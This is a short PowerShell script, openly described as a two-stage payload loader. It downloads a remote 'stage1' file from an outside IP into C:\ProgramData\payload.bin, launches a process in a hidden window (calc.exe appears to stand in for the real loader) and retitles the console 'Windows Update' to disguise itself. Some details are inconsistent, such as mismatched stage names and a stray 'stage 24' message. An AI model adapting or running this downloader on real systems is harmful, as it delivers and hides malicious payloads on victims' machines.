
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = 'https://192.0.2.132/stage1.ps1',
    [string]$Stage2Path = 'C:\ProgramData\payload.bin',
    [int]$TimeoutSec = 140
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Get-Stage1Payload -SourceUrl $TargetUrl -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec
    if ($StageResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Output "stage 24 initialized"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
